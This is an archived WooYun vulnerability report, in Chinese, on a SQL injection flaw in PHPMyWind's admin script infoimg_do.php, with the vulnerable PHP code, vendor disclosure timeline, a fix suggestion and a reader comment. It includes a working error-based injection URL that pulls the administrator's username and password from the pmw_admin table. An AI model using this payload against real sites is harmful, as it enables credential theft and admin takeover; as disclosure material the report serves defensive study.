{"id": 43530, "wybug_id": "wooyun-2014-082464", "wybug_title": "PHPMyWind最新版SQL注入漏洞", "wybug_corp": "phpmywind.com", "wybug_author": "xfkxfk", "wybug_date": "2014-11-10 15:10", "wybug_open_date": "2015-02-08 15:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向公众公开  简要描述： PHPMyWind最新版SQL注入漏洞，同一文件多处 详细说明：  PHPMyWind最新版SQL注入漏洞，同一文件多处PHPMyWind的整个系统权限分为：\n超级管理员站点管理员文章发布员普通用户\n此漏洞点在文章发布员权限，有点门槛，但是门槛不高文件infoimg_do.php\n<?php\trequire_once(dirname(__FILE__).'/inc/config.inc.php');IsModelPriv('infoimg');/***************************(C)2010-2014 phpMyWind.comupdate: 2014-5-28 15:30:12person: Feng***************************///初始化参数$action  = isset($action)  ? $action  : '';$keyword = isset($keyword) ? $keyword : '';//删除单条记录if($action == 'del'){\t//栏目权限验证\t$r = $dosql->GetOne(\"SELECT `classid` FROM `#@__$tbname` WHERE `id`=$id\");\tIsCategoryPriv($r['classid'],'del',1);\t$deltime = time();\t$dosql->ExecNoneQuery(\"UPDATE `#@__$tbname` SET delstate='true', deltime='$deltime' WHERE id=$id\");}\n可以看到这里有两处：$tbname和$id都是直接进入sql语句，没有任何引号保护和处理的，导致sql注入漏洞   漏洞证明：  登录文章发布员，发送如下请求，即可获得管理员权限\nhttp://localhost/phpmywind/admin/infoimg_do.php?tbname=infoimg&action=del&id=15 and 1=2 and char(@`'`)=(select 1 from (select count(*),concat(floor(rand(0)*2),(SELECT concat(username,0x23,password) FROM `pmw_admin` limit 0,1))a from information_schema.tables group by a limit 0,1)b) and char(@`'`)\n这里利用id参数注入，tbname参数注入同理\n\n   修复方案：  intval($id)   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-11-10 15:17 厂商回复： 感谢提交漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-12 15:48 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  敢问大牛char(@`'`)为何这样用?    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}